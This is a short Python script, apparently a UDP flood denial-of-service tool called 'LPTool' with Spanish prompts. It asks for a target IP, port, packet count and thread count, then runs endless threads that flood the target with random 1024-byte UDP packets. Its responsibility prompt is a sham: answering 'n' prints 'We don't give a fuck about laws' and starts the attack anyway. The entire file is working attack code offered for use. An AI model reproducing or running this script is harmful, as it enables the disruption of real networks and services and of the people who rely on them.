import random
import socket
import threading

ip = str(input(" IP - "))
puerto = int(input(" Puerto - "))
times = int(input(" Paquetes - "))
threads = int(input(" Conexiones - "))
choice = str(input(" El ataque es bajo tu responsabilidad, estas de acuerdo?: y/n"))
def udpddos():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(puerto))
			for x in range(times):
				s.sendto(data,addr)
			print("[LPTool] Ataque exitoso")
		except:
			print("[LPTool] Algun error ha ocurrido, revise el codigo!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = udpddos)
		th.start()
	else:
		print("We don't give a fuck about laws")
		th = threading.Thread(target = udpddos)
		th.start()
